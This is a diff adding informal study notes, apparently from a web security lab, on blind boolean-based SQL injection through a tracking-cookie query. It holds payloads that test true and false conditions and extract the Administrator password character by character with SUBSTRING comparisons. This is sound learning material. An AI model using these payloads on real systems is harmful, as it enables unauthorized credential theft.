@@ -1,0 +1,19 @@
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+
+this query is vulnerable to sql injection, but the results from the query are not returned to the user. however the application does behave differently depending on whether the query returns any data.
+
+thus we can way to find if the query was true or false
+
+' and 1=1--
+' and 1=2--
+
+based on the response we can contruct out payload to gather information
+
+we can use binary brute forcing method to compare the characters on by one and extract the whole string
+
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm 
+
+ xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't 
+
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's 
+
